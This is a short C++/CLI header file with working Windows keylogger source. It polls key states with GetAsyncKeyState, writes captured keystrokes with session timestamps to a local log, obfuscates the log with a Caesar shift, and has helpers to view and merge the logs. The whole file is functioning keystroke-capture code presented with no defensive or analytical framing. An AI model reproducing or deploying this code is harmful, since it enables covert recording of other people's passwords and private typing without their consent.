#pragma comment(lib, "User32.lib")  // Link against User32 for GetAsyncKeyState
#pragma once

#define _CRT_SECURE_NO_WARNINGS     // Disable warnings for standard C I/O

#include <windows.h>   // For GetAsyncKeyState, Sleep
#include <cstdio>      // For FILE*, fopen, fgetc, fputc, fprintf
#include <ctime>       // For time_t, time, ctime

// Paths for log files
const char* LOG_FILE = "keylog.txt";
const char* ENC_FILE = "keylog_enc.txt";

/// Polls the keyboard and returns the ASCII code of the first detected key press,
/// or 0 if no key is pressed.
char getKey() {
    // Scan virtual-key codes from 8 to 190
    for (int vk = 8; vk <= 190; ++vk) {
        if (GetAsyncKeyState(vk) & 0x8000) {
            return static_cast<char>(vk);
        }
    }
    return 0;
}

/// Starts logging keystrokes to LOG_FILE until the ESC key (27) is pressed.
/// Each session is marked with start and end timestamps.
void logKeys() {
    FILE* f = fopen(LOG_FILE, "a");
    if (!f) return;  // Unable to open log file

    // Write session start time
    time_t now = time(nullptr);
    fprintf(f, "\nSession Start: %s", ctime(&now));

    // Loop until ESC is pressed
    while (true) {
        char c = getKey();
        if (c == 27)  // ESC key
            break;
        if (c)
            fprintf(f, "%c", c);
        Sleep(50);  // Poll every 50 ms
    }

    // Write session end time
    now = time(nullptr);
    fprintf(f, "\nSession End: %s", ctime(&now));

    fclose(f);
}

/// Reads LOG_FILE, applies a simple Caesar cipher (shift +3) to each byte,
/// and writes the result to ENC_FILE.
void encryptLog() {
    FILE* in = fopen(LOG_FILE, "r");
    FILE* out = fopen(ENC_FILE, "w");
    if (!in || !out) {
        if (in)  fclose(in);
        if (out) fclose(out);
        return;  // Unable to open files for encryption
    }

    // Shift each character and write to output
    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch + 3, out);
    }

    fclose(in);
    fclose(out);
}

/// Reads the contents of ENC_FILE and returns them as a managed System::String.
/// If the file cannot be opened, returns an error message.
System::String^ viewEncrypted() {
    FILE* f = fopen(ENC_FILE, "r");
    if (!f) {
        return "Cannot open encrypted log file.";
    }

    System::String^ result = "";
    int ch;
    while ((ch = fgetc(f)) != EOF) {
        result += static_cast<wchar_t>(ch);
    }
    fclose(f);
    return result;
}

/// Concatenates LOG_FILE and ENC_FILE into a single file named "combined.txt".
void combineLogs() {
    FILE* out = fopen("combined.txt", "w");
    if (!out) return;  // Unable to create combined file

    // Append original log
    FILE* in1 = fopen(LOG_FILE, "r");
    if (in1) {
        int ch;
        while ((ch = fgetc(in1)) != EOF) {
            fputc(ch, out);
        }
        fclose(in1);
    }

    // Append encrypted log
    FILE* in2 = fopen(ENC_FILE, "r");
    if (in2) {
        int ch;
        while ((ch = fgetc(in2)) != EOF) {
            fputc(ch, out);
        }
        fclose(in2);
    }

    fclose(out);
}